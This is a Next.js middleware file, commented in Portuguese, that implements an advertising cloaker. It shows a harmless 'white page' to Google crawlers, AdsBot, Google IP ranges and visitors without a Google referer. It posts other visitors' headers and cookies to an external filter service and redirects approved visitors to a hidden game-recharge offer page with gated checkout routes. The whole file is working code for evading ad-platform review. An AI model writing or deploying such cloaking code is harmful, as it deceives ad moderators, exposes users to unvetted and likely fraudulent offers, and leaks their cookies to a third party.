import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

// Configuração do filtro
const FILTER_TRACKING_ID = process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ID
if (!FILTER_TRACKING_ID) {
  throw new Error('❌ NEXT_PUBLIC_CLOAKER_TRACKING_ID não configurado no .env')
}

const FILTER_CONFIG = {
  url: `https://www.altercpa.one/fltr/${FILTER_TRACKING_ID}`,
  whitePagePath: '/',  // Página principal agora é white page
  offerPagePath: '/recargajogo'  // Página de oferta
}

// Cache para evitar múltiplas verificações do mesmo usuário
const filterCache = new Map<string, { type: string; timestamp: number }>()
const CACHE_DURATION = 60 * 1000 // 1 minuto

export async function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname
  const hostname = request.headers.get('host') || ''
  
  // 🚫 IGNORAR requisições de assets, APIs e arquivos estáticos
  const shouldIgnore = 
    pathname.startsWith('/_next/') ||
    pathname.startsWith('/api/') ||
    pathname.includes('.') && !pathname.endsWith('/') || // Arquivos com extensão (exceto rotas)
    pathname === '/favicon.ico' ||
    pathname === '/robots.txt' ||
    pathname === '/sitemap.xml'
  
  if (shouldIgnore) {
    return NextResponse.next()
  }
  
  // Pegar base URL do .env
  const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'https://localhost:3000'
  
  // 🛡️ SEGURANÇA: Bloquear acesso via IP
  if (/^\d+\.\d+\.\d+\.\d+/.test(hostname)) {
    console.log('🚫 [Security] Acesso via IP bloqueado:', hostname)
    return NextResponse.redirect(new URL(baseUrl, request.url))
  }
  
  // ⚠️ MONITORAMENTO: Logar acessos sem Cloudflare (mas não bloquear)
  const cfRay = request.headers.get('cf-ray')
  if (!cfRay && !hostname.includes('localhost')) {
    console.log('⚠️ [Security] Acesso sem Cloudflare:', {
      host: hostname,
      ip: request.ip || request.headers.get('x-forwarded-for') || 'unknown'
    })
  }
  
  
  // Rotas da whitepage que NUNCA devem passar pelo filtro
  // IMPORTANTE: "/" NÃO está aqui - deve passar pelo filtro!
  const whitePageRoutes = [
    '/politica-de-privacidade',
    '/politica-de-reembolso',
    '/quem-somos',
    '/loja', 
    '/unsubscribe', 
    '/ativar-conversao-google', 
    '/meus-pedidos', 
    '/blog',
    '/politica-privacidade',
    '/termos',
    '/privacidade'
  ]
  const isWhitePageRoute = whitePageRoutes.includes(pathname) || pathname.startsWith('/produto/') || pathname.startsWith('/blog/')
  
  // Verificar domínio - ativar _x9f2w8k5 para o domínio configurado
  const targetDomain = baseUrl.replace('https://', '').replace('http://', '')
  const isTargetDomain = hostname.includes(targetDomain)
  
  // CLOAKER ATIVADO apenas para o domínio configurado
  if (!isTargetDomain) {
    console.log(`❌ [Cloaker] Domínio não é ${targetDomain} - desativado`)
    return NextResponse.next()
  }
  
  // Verificar se o _x9f2w8k5 está habilitado
  const _x9f2w8k5Enabled = process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED === 'true'
  
  if (!_x9f2w8k5Enabled) {
    console.log('🔓 [Cloaker] Desativado via env (NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED)')
    return NextResponse.next()
  }
  
  // ✅ VERIFICAR COOKIE PRIMEIRO - Se tem cookie válido, libera TUDO
  const _x9f2w8k5Cookie = request.cookies.get('_x9f2w8k5_verified')
  const hasValidCookie = _x9f2w8k5Cookie?.value === 'true'
  
  if (hasValidCookie) {
    return NextResponse.next()
  }

  // Rotas da whitepage sempre acessíveis (sem verificação de _x9f2w8k5)
  if (isWhitePageRoute) {
    return NextResponse.next()
  }

  // Proteger rota /promo - APENAS acessível com cookie do _x9f2w8k5 (manter proteção para não quebrar links antigos)
  if (pathname === '/promo' || pathname === '/promo/') {
    return NextResponse.redirect(new URL('/', request.url))
  }

  // Proteger rota /success - mas permitir Google Ads Bot e requisições internas
  if (pathname.startsWith('/success')) {
    const userAgent = request.headers.get('user-agent') || ''
    const referer = request.headers.get('referer') || ''
    const url = request.nextUrl
    const hasTransactionId = url.searchParams.has('transactionId')
    const hasAmount = url.searchParams.has('amount')
    
    // Detectar bots do Google (Googlebot, AdsBot, etc)
    const isGoogleBot = /googlebot|adsbot-google|google-ads/i.test(userAgent)
    
    // Detectar requisições internas (UTMify, scripts do próprio site)
    const isInternalRequest = referer.includes(request.headers.get('host') || '')
    
    // Se é bot do Google, deixar passar SEMPRE (para registrar conversão)
    if (isGoogleBot) {
      return NextResponse.next()
    }
    
    // Se é requisição interna (UTMify), deixar passar
    if (isInternalRequest) {
      return NextResponse.next()
    }
    
    // Se não é bot/interno e não tem parâmetros, redirecionar para white page
    if (!hasTransactionId || !hasAmount) {
      return NextResponse.redirect(new URL('/', request.url))
    }
    
    // Se chegou aqui sem cookie, bloquear
    return NextResponse.redirect(new URL('/', request.url))
  }

  // Proteger rota /checkout - APENAS acessível com cookie (vem do /recargajogo)
  if (pathname.startsWith('/checkout')) {
    return NextResponse.redirect(new URL('/', request.url))
  }

  // Proteger rota /recargajogo - APENAS acessível com cookie do _x9f2w8k5
  if (pathname.startsWith('/recargajogo')) {
    return NextResponse.redirect(new URL('/', request.url))
  }

  // Não aplicar _x9f2w8k5 nas rotas internas e arquivos estáticos (deixar passar)
  if (
    pathname.startsWith('/api') ||
    pathname.startsWith('/_next/') ||
    pathname.startsWith('/images') ||
    // pathname.startsWith('/success') || // REMOVIDO - /success tem verificação própria acima
    // pathname.startsWith('/checkout') || // REMOVIDO - /checkout tem verificação própria acima
    pathname.startsWith('/analytics') ||
    pathname.startsWith('/fonts') ||
    pathname.startsWith('/manifest') ||
    pathname.startsWith('/icon-') ||
    pathname.startsWith('/sw.js') ||
    pathname === '/robots.txt' ||
    pathname === '/sitemap.xml' ||
    pathname === '/favicon.ico' ||
    pathname === '/favicon.svg' ||
    pathname.includes('.js') ||
    pathname.includes('.css') ||
    pathname.includes('.png') ||
    pathname.includes('.jpg') ||
    pathname.includes('.ico') ||
    pathname.includes('.svg') ||
    pathname.includes('.woff') ||
    pathname.includes('.woff2') ||
    pathname.includes('.json') ||
    pathname.includes('.xml')
  ) {
    return NextResponse.next()
  }

  // Se não for rota raiz (/), redirecionar para / (white page)
  if (pathname !== '/') {
    return NextResponse.redirect(new URL('/', request.url))
  }

  // ===== APENAS ROTA / (raiz) chega aqui =====
  // Cookie já foi verificado no início - se chegou aqui, não tem cookie

  // 🛡️ FILTRO DE REFERER: Verificar se vem do Google (APENAS para rota /)
  const referer = request.headers.get('referer') || ''
  const isFromGoogle = referer === 'https://www.google.com/'
  
  // Se NÃO vem do Google = BOT!
  if (!isFromGoogle) {
    return NextResponse.next() // Mostrar white page sem chamar _x9f2w8k5
  }

  // 🚀 VERIFICAR IP DO GOOGLE: Bloquear AdsBot que simula usuário real
  const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || request.ip || 'unknown'
  
  // Verificar se é IP do Google (AdsBot, Googlebot, etc)
  const isGoogleIP = clientIp.startsWith('2001:4860:') || // IPv6 Google
                     clientIp.startsWith('66.249.') ||    // Googlebot IPv4
                     clientIp.startsWith('66.102.') ||    // Google IPv4
                     clientIp.startsWith('64.233.') ||    // Google IPv4
                     clientIp.startsWith('72.14.') ||     // Google IPv4
                     clientIp.startsWith('209.85.') ||    // Google IPv4
                     clientIp.startsWith('216.239.')      // Google IPv4
  
  if (isGoogleIP) {
    return NextResponse.next() // Mostrar white page sem chamar _x9f2w8k5
  }

  // 🚀 CACHE: Verificar se já verificamos este usuário recentemente
  const userAgent = request.headers.get('user-agent') || ''
  const cacheKey = `${clientIp}-${userAgent.substring(0, 50)}` // Limitar tamanho
  
  const cached = filterCache.get(cacheKey)
  if (cached && (Date.now() - cached.timestamp) < CACHE_DURATION) {
    // Usar resultado do cache
    if (cached.type === 'white') {
      return NextResponse.next() // Mostrar white page
    } else {
      // Redirecionar para /recargajogo
      const redirectUrl = new URL(FILTER_CONFIG.offerPagePath, request.url)
      redirectUrl.search = request.nextUrl.search
      const response = NextResponse.redirect(redirectUrl)
      response.cookies.set('_x9f2w8k5_verified', 'true', {
        httpOnly: true,
        secure: true,
        sameSite: 'lax',
        maxAge: 60 * 60 * 24
      })
      return response
    }
  }

  try {
    // Preparar dados do servidor EXATAMENTE como o PHP faz
    const serverData = {
      HTTP_HOST: request.headers.get('host') || '',
      HTTP_USER_AGENT: request.headers.get('user-agent') || '',
      HTTP_ACCEPT: request.headers.get('accept') || '',
      HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
      HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
      HTTP_REFERER: request.headers.get('referer') || '',
      HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || '',
      HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || '',
      REMOTE_ADDR: request.ip || request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for') || '',
      REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
      REQUEST_METHOD: request.method,
      SERVER_PROTOCOL: 'HTTP/1.1',
      QUERY_STRING: request.nextUrl.search.substring(1),
      HTTP_COOKIE: request.headers.get('cookie') || '',
      HTTP_SEC_CH_UA: request.headers.get('sec-ch-ua') || '',
      HTTP_SEC_CH_UA_MOBILE: request.headers.get('sec-ch-ua-mobile') || '',
      HTTP_SEC_CH_UA_PLATFORM: request.headers.get('sec-ch-ua-platform') || '',
    }

    // Fazer requisição para o _x9f2w8k5 (EXATAMENTE como o PHP)
    const formBody = new URLSearchParams(serverData as any).toString()
    
    const _x9f2w8k5Response = await fetch(FILTER_CONFIG.url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:135.0) Gecko/20100101 Firefox/135.0',
        'Accept-Encoding': 'gzip, deflate, br'
      },
      body: formBody
    })

    let result: { type: string; url: string; result?: string; action?: string; reason?: number }

    const responseText = await _x9f2w8k5Response.text()
    
    if (responseText && responseText.trim()) {
      try {
        result = JSON.parse(responseText)
      } catch (e) {
        result = {
          type: 'white',
          url: baseUrl + '/'
        }
      }
    } else {
      // Fallback: se vazio, mostrar white page
      result = {
        type: 'white',
        url: baseUrl + '/'
      }
    }

    // Salvar no cache
    filterCache.set(cacheKey, {
      type: result.type,
      timestamp: Date.now()
    })

    // Limpar cache antigo (mais de 5 minutos)
    for (const [key, value] of filterCache.entries()) {
      if (Date.now() - value.timestamp > 5 * 60 * 1000) {
        filterCache.delete(key)
      }
    }

    // Se for "white" (bot/crawler), mostrar white page (/)
    if (result.type === 'white') {
      return NextResponse.next()
    }

    // Se for "black" (usuário real), REDIRECIONAR para /recargajogo com cookie
    // Criar URL sem barra final
    const redirectUrl = new URL(FILTER_CONFIG.offerPagePath, request.url)
    // Manter query params (gclid, utm, etc)
    redirectUrl.search = request.nextUrl.search
    
    // Criar resposta com cookie de verificação (httpOnly - não pode ser forjado)
    const response = NextResponse.redirect(redirectUrl)
    response.cookies.set('_x9f2w8k5_verified', 'true', {
      httpOnly: true,  // Cookie não acessível via JavaScript
      secure: true,    // Apenas HTTPS
      sameSite: 'lax', // Proteção CSRF
      maxAge: 60 * 60 * 24 // 24 horas
    })
    
    // Salvar UTMs em cookie
    const utmParams = [
      'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
      'gclid', 'fbclid', 'msclkid', 'ttclid',
      'gad_source', 'gad_campaignid', 'gbraid', 'wbraid',
      'src', 'sck', 'xcod', 'keyword', 'device', 'network', 'cuponeria'
    ]
    
    const searchParams = request.nextUrl.searchParams
    utmParams.forEach(param => {
      const value = searchParams.get(param)
      if (value) {
        response.cookies.set(`utmify_${param}`, value, {
          httpOnly: false,
          secure: true,
          sameSite: 'lax',
          maxAge: 60 * 60 * 24 * 30
        })
      }
    })
    
    return response

  } catch (error) {
    // Em caso de erro, mostrar white page por segurança (silencioso)
    const url = request.nextUrl.clone()
    url.pathname = FILTER_CONFIG.whitePagePath
    return NextResponse.rewrite(url)
  }
}

// Configurar em quais rotas o middleware deve rodar
export const config = {
  matcher: [
    /*
     * Match em TODAS as rotas, exceto arquivos estáticos
     * O middleware vai validar e redirecionar rotas inválidas
     */
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
}
